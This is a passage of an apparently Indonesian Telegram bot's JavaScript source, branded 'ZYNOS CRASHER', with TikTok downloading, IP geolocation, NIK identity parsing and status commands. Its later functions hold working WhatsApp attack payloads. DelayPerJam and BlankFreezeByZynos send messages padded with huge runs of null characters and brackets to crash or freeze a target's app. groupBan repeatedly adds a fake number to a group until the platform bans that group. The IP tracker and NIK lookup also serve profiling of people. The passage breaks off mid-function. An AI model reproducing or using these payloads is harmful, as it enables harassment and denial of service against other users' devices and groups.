                callback_data: `ttdl_${encodedUrl}_audio`,
                style: "danger" 
              }
            ]
          ]
        }
      });
    } else {
      // KALO GA ADA THUMBNAIL, LANGSUNG KIRIM BUTTON
      await ctx.reply(
        `
<blockquote>🎬 TIKTOK VIDEO FOUND</blockquote>
──────────────────────
📝 <b>Title:</b> ${title.substring(0, 50)}${title.length > 50 ? '...' : ''}
👤 <b>Author:</b> @${author}
⏱️ <b>Duration:</b> ${duration} detik
──────────────────────
📥 <b>Pilih kualitas download:</b>
乙 ㄚ 几 ㄖ 丂
        `,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { 
                  text: "🎥 HD (With Watermark)", 
                  callback_data: `ttdl_${encodedUrl}_hd`,
                  style: "primary" 
                },
                { 
                  text: "🎬 No Watermark", 
                  callback_data: `ttdl_${encodedUrl}_nowm`,
                  style: "success" 
                }
              ],
              [
                { 
                  text: "🎵 Audio Only", 
                  callback_data: `ttdl_${encodedUrl}_audio`,
                  style: "danger" 
                }
              ]
            ]
          }
        }
      );
    }

  } catch (error) {
    console.error('[TTDL] Error:', error.message);
    
    let errorMsg = error.message;
    if (error.code === 'ECONNABORTED') {
      errorMsg = 'TIMEOUT - Server terlalu lama merespon';
    } else if (error.response?.status === 404) {
      errorMsg = 'Video tidak ditemukan atau privat';
    } else if (error.response?.status === 500) {
      errorMsg = 'Server API error';
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ TIKTOK DOWNLOAD FAILED</blockquote>
──────────────────────
🌐 <b>URL:</b> ${targetUrl}
──────────────────────
🐛 ERROR: ${errorMsg}
──────────────────────
💡 <b>PENYEBAB:</b>
• URL tidak valid
• Video privat
• Server API error
• Timeout (20 detik)
──────────────────────
📌 Coba: /ttdl https://vt.tiktok.com/xxxxx
乙 ㄚ 几 ㄖ 丂
      `,
      { parse_mode: "HTML" }
    );
  }
});

// ====== HANDLER BUTTON TTDL ======
bot.action(/^ttdl_(.+)_(hd|nowm|audio)$/, async (ctx) => {
  const callbackData = ctx.match[0];
  const parts = callbackData.split('_');
  const quality = parts.pop();
  const encodedUrl = parts.slice(1).join('_');
  const url = decodeURIComponent(encodedUrl);

  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  const qualityLabels = {
    'hd': '🎥 HD (With Watermark)',
    'nowm': '🎬 No Watermark',
    'audio': '🎵 Audio Only'
  };

  // KIRIM PESAN PROGRESS
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>📥 DOWNLOADING TIKTOK</blockquote>
──────────────────────
🌐 <b>URL:</b> ${url}
📱 <b>Quality:</b> ${qualityLabels[quality] || quality}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
⏳ Mengunduh media...
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML"
  });

  try {
    // AMBIL DATA DARI API
    const apiUrl = `https://bintangapi.my.id/api/downloader/tiktok?url=${encodeURIComponent(url)}`;
    const response = await axios.get(apiUrl, {
      timeout: 30000,
      headers: {
        'Accept': 'application/json'
      }
    });

    const data = response.data;

    if (data.status !== 200 || !data.data) {
      throw new Error(data.message || 'Gagal mengambil data');
    }

    const videoData = data.data;
    let downloadUrl = null;
    let fileType = 'video';
    let caption = '';

    // TENTUKAN LINK SESUAI KUALITAS
    if (quality === 'hd') {
      downloadUrl = videoData.play || videoData.play_hd || videoData.wmplay;
      caption = `🎥 HD Video (With Watermark)`;
    } else if (quality === 'nowm') {
      downloadUrl = videoData.wmplay || videoData.play || videoData.play_hd;
      caption = `🎬 No Watermark Video`;
    } else if (quality === 'audio') {
      downloadUrl = videoData.music;
      fileType = 'audio';
      caption = `🎵 Audio Only`;
    }

    if (!downloadUrl) {
      throw new Error('Link download tidak tersedia untuk kualitas ini');
    }

    // HAPUS PESAN PROGRESS
    await ctx.deleteMessage(msg.message_id);

    // KIRIM MEDIA
    if (fileType === 'audio') {
      // KIRIM AUDIO
      await ctx.replyWithAudio(downloadUrl, {
        caption: `
<blockquote>✅ TIKTOK DOWNLOAD COMPLETE</blockquote>
──────────────────────
📝 <b>Title:</b> ${videoData.title?.substring(0, 50) || 'TikTok Audio'}...
👤 <b>Author:</b> @${videoData.author?.unique_id || 'Unknown'}
📱 <b>Quality:</b> ${qualityLabels[quality]}
⏰ <b>Waktu:</b> ${date}
──────────────────────
乙 ㄚ 几 ㄖ 丂
        `,
        parse_mode: "HTML"
      });
    } else {
      // KIRIM VIDEO
      await ctx.replyWithVideo(downloadUrl, {
        caption: `
<blockquote>✅ TIKTOK DOWNLOAD COMPLETE</blockquote>
──────────────────────
📝 <b>Title:</b> ${videoData.title?.substring(0, 50) || 'TikTok Video'}...
👤 <b>Author:</b> @${videoData.author?.unique_id || 'Unknown'}
📱 <b>Quality:</b> ${qualityLabels[quality]}
⏰ <b>Waktu:</b> ${date}
──────────────────────
乙 ㄚ 几 ㄖ 丂
        `,
        parse_mode: "HTML"
      });
    }

  } catch (error) {
    console.error('[TTDL] Download Error:', error.message);
    
    let errorMsg = error.message;
    if (error.code === 'ECONNABORTED') {
      errorMsg = 'TIMEOUT - Server terlalu lama merespon';
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ TIKTOK DOWNLOAD FAILED</blockquote>
──────────────────────
🌐 <b>URL:</b> ${url}
📱 <b>Quality:</b> ${qualityLabels[quality] || quality}
──────────────────────
🐛 ERROR: ${errorMsg}
──────────────────────
💡 Coba kualitas lain atau cek URL
乙 ㄚ 几 ㄖ 丂
      `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END TIKTOK DOWNLOADER ======

// ====== TRACK IP ======
bot.command("trackip", checkCmd("trackip"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // PARSE ARGUMEN
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ FORMAT SALAH GOBLOK!</blockquote>
──────────────────────
📌 <b>Gunakan:</b> /trackip [ip_address]
📋 <b>Contoh:</b>
• /trackip 8.8.8.8
• /trackip 1.1.1.1
──────────────────────
🌐 <b>Fitur:</b> Track IP Address
💡 <b>Data:</b> Lokasi, ISP, Hostname, dll
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  let ip = args[1].trim();

  // VALIDASI IPv4
  const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  if (!ipv4Regex.test(ip)) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ IP TIDAK VALID!</blockquote>
──────────────────────
📌 IP: ${ip}
💡 Format IPv4 yang benar:
• 8.8.8.8
• 1.1.1.1
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  // KIRIM PESAN PROGRESS
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🌐 TRACKING IP ADDRESS</blockquote>
──────────────────────
🎯 <b>Target:</b> ${ip}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
⏳ Mengambil data IP...
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML"
  });

  try {
    const ipApiRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`, {
      timeout: 10000
    });

    const data = ipApiRes.data;

    if (data.status !== 'success') {
      throw new Error(data.message || 'Gagal mengambil data IP');
    }

    // REVERSE DNS
    let hostname = data.reverse || 'Tidak ditemukan';
    if (!hostname || hostname === 'Tidak ditemukan') {
      try {
        const dns = require('dns').promises;
        const hostnames = await dns.reverse(data.query);
        hostname = hostnames[0] || 'Tidak ditemukan';
      } catch (e) {
        hostname = 'Tidak ditemukan';
      }
    }

    // BUILD MAPS LINK
    const mapsLink = `https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lon}`;
    const streetViewLink = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${data.lat},${data.lon}`;

    // HAPUS PESAN PROGRESS
    await ctx.deleteMessage(msg.message_id);

    // KIRIM HASIL PAKE BLOCKQUOTE
    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>🌐 INFORMASI IP ADDRESS</blockquote>
──────────────────────
📌 <b>IP Address</b> : <code>${data.query}</code>
🏷️ <b>Hostname</b>   : <code>${hostname}</code>
──────────────────────
🌍 <b>LOKASI GEOGRAFIS</b>
🌎 Benua       : ${data.continent || 'N/A'} (${data.continentCode || 'N/A'})
🏳️ Negara      : ${data.country || 'N/A'} (${data.countryCode || 'N/A'})
🗺️ Wilayah     : ${data.regionName || 'N/A'} (${data.region || 'N/A'})
🏙️ Kota        : ${data.city || 'N/A'}
📍 Distrik     : ${data.district || 'N/A'}
📮 Kode Pos    : ${data.zip || 'N/A'}
📌 Koordinat   : ${data.lat || 'N/A'}, ${data.lon || 'N/A'}
🕐 Zona Waktu  : ${data.timezone || 'N/A'} (UTC${data.offset >= 0 ? '+' : ''}${data.offset ? (data.offset / 3600).toFixed(1) : 'N/A'})
💰 Mata Uang   : ${data.currency || 'N/A'}
──────────────────────
🖧 <b>INFORMASI KONEKSI</b>
📡 ISP         : ${data.isp || 'N/A'}
🏢 Organisasi  : ${data.org || 'N/A'}
🔗 AS          : ${data.as || 'N/A'} (${data.asname || 'Tidak diketahui'})
📱 Mobile      : ${data.mobile ? '✅ Ya' : '❌ Tidak'}
🛡️ Proxy      : ${data.proxy ? '✅ Ya' : '❌ Tidak'}
🏠 Hosting     : ${data.hosting ? '✅ Ya' : '❌ Tidak'}
──────────────────────
🔗 <b>LINK LANGSUNG</b>
🗺️ Google Maps : ${mapsLink}
📸 Street View : ${streetViewLink}
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });

    // KIRIM LOKASI (MAP)
    if (data.lat && data.lon) {
      await ctx.replyWithLocation(parseFloat(data.lat), parseFloat(data.lon));
    }

  } catch (error) {
    console.error('[TRACKIP] Error:', error.message);

    let errorMsg = error.message;
    if (error.code === 'ECONNABORTED') {
      errorMsg = 'TIMEOUT - Server terlalu lama merespon';
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ TRACK IP FAILED</blockquote>
──────────────────────
🎯 <b>Target:</b> ${ip}
👤 <b>User:</b> ${username}
──────────────────────
🐛 ERROR: ${errorMsg}
──────────────────────
💡 <b>PENYEBAB:</b>
• IP tidak valid
• Server API down
• Timeout (10 detik)
──────────────────────
📌 Coba: /trackip 8.8.8.8
乙 ㄚ 几 ㄖ 丂
      `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END TRACK IP ======

// ====== NIK CHECKER (PAKE DATABASE LOKAL) ======
bot.command("nik", checkCmd("nik"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ FORMAT SALAH GOBLOK!</blockquote>
──────────────────────
📌 <b>Gunakan:</b> /nik [nomor_nik]
📋 <b>Contoh:</b>
• /nik 5206085405880001
• /nik 3172022309870001
──────────────────────
💡 <b>Fitur:</b> Cek Data Kependudukan (OFFLINE)
📊 <b>Data:</b> Nama (simulasi), Alamat, Domisili, dll
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  const nik = args[1].trim();

  // VALIDASI NIK (16 digit)
  if (!/^\d{16}$/.test(nik)) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ NIK TIDAK VALID!</blockquote>
──────────────────────
📌 NIK: ${nik}
💡 NIK harus 16 digit angka
📋 Contoh: 5206085405880001
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  // 🔥 LOAD DATABASE LOKAL
  const NIK_DATA_PATH = path.join(__dirname, './database/nik_data.json');
  
  if (!fs.existsSync(NIK_DATA_PATH)) {
    return ctx.reply(
      "❌ *Database NIK tidak ditemukan!*\n\n" +
      "Pastikan file `./database/nik_data.json` ada.",
      { parse_mode: 'Markdown' }
    );
  }

  const nikData = JSON.parse(fs.readFileSync(NIK_DATA_PATH, 'utf8'));
  const provinsi = nikData.provinsi || {};
  const kabkot = nikData.kabkot || {};
  const kecamatan = nikData.kecamatan || {};

  // 🔥 PARSE NIK
  const provCode = nik.substring(0, 2);
  const kabCode = nik.substring(0, 4);
  const kecCode = nik.substring(0, 6);
  
  // GENDER & TANGGAL LAHIR
  let tgl = parseInt(nik.substring(6, 8));
  const bln = nik.substring(8, 10);
  const thn = nik.substring(10, 12);

  let gender = "LAKI-LAKI";
  if (tgl > 40) {
    gender = "PEREMPUAN";
    tgl -= 40;
  }

  let year = parseInt(thn);
  year += (year <= new Date().getFullYear() % 100) ? 2000 : 1900;

  const tanggalLahir = `${tgl.toString().padStart(2, '0')}/${bln}/${year}`;

  // UMUR
  const birthDate = new Date(year, parseInt(bln) - 1, tgl);
  const now = new Date();
  let usia = now.getFullYear() - birthDate.getFullYear();
  if (now.getMonth() < birthDate.getMonth() || 
      (now.getMonth() === birthDate.getMonth() && now.getDate() < birthDate.getDate())) {
    usia--;
  }

  // ULTAH MENDATANG
  let nextBirthday = new Date(now.getFullYear(), birthDate.getMonth(), birthDate.getDate());
  if (nextBirthday < now) {
    nextBirthday = new Date(now.getFullYear() + 1, birthDate.getMonth(), birthDate.getDate());
  }
  const diffDays = Math.ceil((nextBirthday - now) / (1000 * 60 * 60 * 24));

  // ZODIAK
  const zodiacs = [
    { start: [1,20], end: [2,18], name: "Aquarius" },
    { start: [2,19], end: [3,20], name: "Pisces" },
    { start: [3,21], end: [4,19], name: "Aries" },
    { start: [4,20], end: [5,20], name: "Taurus" },
    { start: [5,21], end: [6,20], name: "Gemini" },
    { start: [6,21], end: [7,22], name: "Cancer" },
    { start: [7,23], end: [8,22], name: "Leo" },
    { start: [8,23], end: [9,22], name: "Virgo" },
    { start: [9,23], end: [10,22], name: "Libra" },
    { start: [10,23], end: [11,21], name: "Scorpio" },
    { start: [11,22], end: [12,21], name: "Sagittarius" },
    { start: [12,22], end: [1,19], name: "Capricorn" }
  ];

  let zodiak = "Unknown";
  for (const z of zodiacs) {
    const startMonth = z.start[0], startDay = z.start[1];
    const endMonth = z.end[0], endDay = z.end[1];
    if ((birthDate.getMonth() + 1 === startMonth && birthDate.getDate() >= startDay) ||
        (birthDate.getMonth() + 1 === endMonth && birthDate.getDate() <= endDay) ||
        (birthDate.getMonth() + 1 > startMonth && birthDate.getMonth() + 1 < endMonth)) {
      zodiak = z.name;
      break;
    }
  }

  // PASARAN (Weton)
  const pasaranList = ["Legi", "Pahing", "Pon", "Wage", "Kliwon"];
  const baseDate = new Date(1900, 0, 1);
  const diffDaysPasaran = Math.floor((birthDate - baseDate) / (1000 * 60 * 60 * 24));
  const pasaran = pasaranList[diffDaysPasaran % 5];

  // 🔥 AMBIL DATA DARI DATABASE
  const nama = "DATA DUMMY"; // Data nama gak ada di NIK
  const provinsiName = provinsi[provCode] || "Tidak diketahui";
  const kabkotName = kabkot[kabCode] || "Tidak diketahui";
  const kecamatanName = kecamatan[kecCode] || "Tidak diketahui";

  // KIRIM PESAN PROGRESS
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🔍 CEK DATA NIK (OFFLINE)</blockquote>
──────────────────────
🎯 <b>NIK:</b> ${nik}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
⏳ Memproses data dari database...
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML"
  });

  await ctx.deleteMessage(msg.message_id);

  // KIRIM HASIL
  await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>✅ DATA NIK DITEMUKAN</blockquote>
──────────────────────
📌 <b>NIK</b> : <code>${nik}</code>
──────────────────────
👤 <b>IDENTITAS DIRI</b>
📛 Nama         : ${nama}
⚧️ Kelamin      : ${gender}
📍 Tempat Lahir : ${tanggalLahir}
🎂 Usia         : ${usia} tahun
♈ Zodiak       : ${zodiak}
📅 Pasaran      : ${pasaran}
🎂 Ultah        : ${diffDays} hari lagi
──────────────────────
🌍 <b>DATA DOMISILI</b>
🏛️ Provinsi     : ${provinsiName}
🏙️ Kabupaten    : ${kabkotName}
🗺️ Kecamatan    : ${kecamatanName}
📮 Alamat       : (Data tidak tersedia)
──────────────────────
📋 <b>METADATA</b>
🏷️ Kode Prov   : ${provCode}
🏷️ Kode Kab    : ${kabCode}
🏷️ Kode Kec    : ${kecCode}
🔢 Kode Unik   : ${nik.substring(12, 16)}
──────────────────────
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML"
  });
});
// ====== END NIK CHECKER ======

// ====== OS / STATUS SYSTEM (RICH MESSAGE) ======
bot.command("os", checkCmd("os"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('dddd, DD - MMMM - YYYY');

  // AMBIL DATA SISTEM
  const os = require('os');
  const cpuModel = os.cpus()[0]?.model || 'Unknown';
  const cpuCores = os.cpus().length;
  const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
  const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
  const usedRam = (totalRam - freeRam).toFixed(2);
  const uptime = process.uptime();
  const days = Math.floor(uptime / 86400);
  const hours = Math.floor((uptime % 86400) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  const uptimeBot = `${days}d, ${hours}h, ${minutes}m, ${seconds}s`;

  // HITUNG PING
  const start = performance.now();
  const pingMsg = await ctx.reply("📡 Mengecek status...");
  const ping = Math.round(performance.now() - start);
  await ctx.deleteMessage(pingMsg.message_id);

  // 🔥 BUILD RICH MESSAGE
  const richMessage = `
<blockquote>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</blockquote>

<h1>METADATA</h1>
<pre>• Nama Bot : ZYNOS CRASHER</pre>
<pre>• User : ${username}</pre>
<pre>• Status : 🟢 Online</pre>

<hr/>

<h2>📋 SPESIFIKASI SISTEM</h2>
<table bordered striped>
<tr><th>Komponen</th><th>Detail</th></tr>
<tr><td>🖥️ Operating System</td><td>Linux (x64)</td></tr>
<tr><td>🧠 CPU Model</td><td>${cpuModel}</td></tr>
<tr><td>⚙️ Total Core CPU</td><td>${cpuCores} Cores</td></tr>
<tr><td>📦 NodeJS Version</td><td>v${process.version.replace('v', '')}</td></tr>
</table>

<h2>💾 ALOKASI MEMORI</h2>
<table bordered striped>
<tr><th>Type</th><th>Kapasitas Space</th></tr>
<tr><td>📊 Total RAM Space</td><td>${totalRam} GB</td></tr>
<tr><td>📊 Used RAM Space</td><td>${usedRam} GB</td></tr>
<tr><td>📊 Free RAM Space</td><td>${freeRam} GB</td></tr>
</table>

<h2>📊 METRIK PERFORMA</h2>
<table bordered striped>
<tr><th>Metrik</th><th>Nilai Log</th></tr>
<tr><td>📡 Latency Response</td><td>${ping} ms</td></tr>
<tr><td>⏱️ Uptime Bot</td><td>${uptimeBot}</td></tr>
<tr><td>📅 Tanggal Server</td><td>${date}</td></tr>
</table>

<hr/>

<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
`;

  try {
    // 🔥 PAKE SEND RICH MESSAGE
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      rich_message: {
        markdown: richMessage
      },
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🏠 Menu Utama", callback_data: "back", style: "primary" },
            { text: "🔄 Refresh", callback_data: "refresh_os_rich", style: "success" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("[OS RICH] Error:", err.message);
    // FALLBACK
    await ctx.reply(richMessage.replace(/<[^>]*>/g, ''), { parse_mode: "HTML" });
  }
});

// ====== HANDLER REFRESH OS RICH ======
bot.action("refresh_os_rich", async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('dddd, DD - MMMM - YYYY');

  const os = require('os');
  const cpuModel = os.cpus()[0]?.model || 'Unknown';
  const cpuCores = os.cpus().length;
  const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
  const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
  const usedRam = (totalRam - freeRam).toFixed(2);
  const uptime = process.uptime();
  const days = Math.floor(uptime / 86400);
  const hours = Math.floor((uptime % 86400) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  const uptimeBot = `${days}d, ${hours}h, ${minutes}m, ${seconds}s`;

  const start = performance.now();
  const ping = Math.round(performance.now() - start);

  const richMessage = `
<blockquote>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</blockquote>

<h1>METADATA</h1>
<pre>• Nama Bot : ZYNOS CRASHER</pre>
<pre>• User : ${username}</pre>
<pre>• Status : 🟢 Online</pre>

<hr/>

<h2>📋 SPESIFIKASI SISTEM</h2>
<table bordered striped>
<tr><th>Komponen</th><th>Detail</th></tr>
<tr><td>🖥️ Operating System</td><td>Linux (x64)</td></tr>
<tr><td>🧠 CPU Model</td><td>${cpuModel}</td></tr>
<tr><td>⚙️ Total Core CPU</td><td>${cpuCores} Cores</td></tr>
<tr><td>📦 NodeJS Version</td><td>v${process.version.replace('v', '')}</td></tr>
</table>

<h2>💾 ALOKASI MEMORI</h2>
<table bordered striped>
<tr><th>Type</th><th>Kapasitas Space</th></tr>
<tr><td>📊 Total RAM Space</td><td>${totalRam} GB</td></tr>
<tr><td>📊 Used RAM Space</td><td>${usedRam} GB</td></tr>
<tr><td>📊 Free RAM Space</td><td>${freeRam} GB</td></tr>
</table>

<h2>📊 METRIK PERFORMA</h2>
<table bordered striped>
<tr><th>Metrik</th><th>Nilai Log</th></tr>
<tr><td>📡 Latency Response</td><td>${ping} ms</td></tr>
<tr><td>⏱️ Uptime Bot</td><td>${uptimeBot}</td></tr>
<tr><td>📅 Tanggal Server</td><td>${date}</td></tr>
</table>

<hr/>

<b>乙 ㄚ 几 ㄖ 丂 - 𝐕❂𝐑𝐕𝐘-𝐑</b>
`;

  try {
    // 🔥 PAKE RICH MESSAGE
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id,
      message_id: ctx.update.callback_query.message.message_id,
      rich_message: {
        markdown: richMessage
      },
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🏠 Menu Utama", callback_data: "back", style: "primary" },
            { text: "🔄 Refresh", callback_data: "refresh_os_rich", style: "success" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("[OS RICH] Refresh error:", err.message);
    // KALO EDIT GAGAL, KIRIM ULANG
    await ctx.reply(richMessage.replace(/<[^>]*>/g, ''), { parse_mode: "HTML" });
  }
  await ctx.answerCbQuery("✅ Status diperbarui!");
});
// ====== END OS ======

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

const dbCmd = "./database/command.json";

if (!fs.existsSync("./database")) {
  fs.mkdirSync("./database", { recursive: true });
}

if (!fs.existsSync(dbCmd)) {
  fs.writeFileSync(dbCmd, JSON.stringify({}, null, 2));
}

function getCmdStatus() {
  try {
    return JSON.parse(fs.readFileSync(dbCmd, "utf8"));
  } catch (err) {
    console.error(err);
    return {};
  }
}

function saveCmdStatus(data) {
  fs.writeFileSync(
    dbCmd,
    JSON.stringify(data, null, 2),
    "utf8"
  );
}

function isCmdOn(cmd) {
  const data = getCmdStatus();
  return data[cmd.toLowerCase()] !== false;
}

function checkCmd(cmd) {
  return async (ctx, next) => {
    if (!isCmdOn(cmd)) {
      return ctx.reply(
        `❌ Command ${cmd} sedang dinonaktifkan oleh owner.`
      );
    }

    return next();
  };
}

bot.command("on", checkOwner, async (ctx) => {

  const cmd = ctx.message.text.split(" ")[1];

  if (!cmd) {
    return ctx.reply("Contoh:\n/on menu");
  }

  const data = getCmdStatus();
  data[cmd.toLowerCase()] = true;
  saveCmdStatus(data);

  ctx.reply(`✅ Command ${cmd} berhasil diaktifkan.`);
});

bot.command("off", checkOwner, async (ctx) => {

  const cmd = ctx.message.text.split(" ")[1];

  if (!cmd) {
    return ctx.reply("Contoh:\n/off menu");
  }

  const data = getCmdStatus();
  data[cmd.toLowerCase()] = false;
  saveCmdStatus(data);

  ctx.reply(`❌ Command ${cmd} berhasil dimatikan.`);
});

bot.command("cmdlist", checkCmd("cmdlist"), async (ctx) => {
  const data = getCmdStatus();

  let text = "📜 LIST STATUS COMMAND\n\n";

  if (Object.keys(data).length === 0) {
    text += "✅ Semua command aktif.";
  } else {
    Object.keys(data).forEach((cmd) => {
      text += `${data[cmd] ? "✅" : "❌"} ${cmd}\n`;
    });
  }

  ctx.reply(text);
});

/////////////////END/////////////////////////
async function DelayPerJam(sock, target, durationHours = 1) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  const startTime = Date.now();
  const durationMs = durationHours * 60 * 60 * 1000;
  let count = 0;

  while (Date.now() - startTime < durationMs) {
    await sock.relayMessage(jid, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\x10" + "\u0000".repeat(1000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000) + "[".repeat(10300) + "source: app",
              version: 3
            }
          }
        }
      }
    }, {});

    count++;
    await sleep(1000);

    if (count % 60 === 0) {
      console.log(`⏳ DelayPerJam: ${Math.round((Date.now() - startTime) / 60000)} menit berjalan`);
    }
  }

  console.log(`✅ DelayPerJam selesai! Total ${count} pesan terkirim dalam ${durationHours} jam.`);
}

async function BlankFreezeByZynos(sock, target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

  await sock.relayMessage(jid, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"zynos","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, {});
}
/*
// ====== FUNGSI GROUP BAN ======
async function groupBan(sock, target) {
  if (!target.endsWith("@g.us")) throw new Error("❌ @g.us server required");
  try {
    await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add");
    return { success: true };
  } catch (e) {
    throw e;
  }
}
// ====== END GROUP BAN ======
*/

async function groupBan(sock, target, ctx) {
  if (!target.endsWith("@g.us")) throw new Error("❌ @g.us server required");

  const fakeNumber = "13135550002@s.whatsapp.net";

  while (true) {
    try {
      await sock.groupParticipantsUpdate(target, [fakeNumber], "add");
      await sleep(1500);
    } catch (e) {
      // CEK ERROR GROUP BAN
      if (e.message.includes("group_not_found") || 
          e.message.includes("group is inaccessible") ||
          e.message.includes("group has been banned")) {
        await ctx.reply(`🚫 GROUP BAN! Group ${target} sudah kena ban/tangguhkan!`);
        throw new Error(`GROUP BAN: ${target}`);
      }
      
      // CEK ERROR SENDER RESTRICT
      if (e.message.includes("account_reachout_restricted")) {
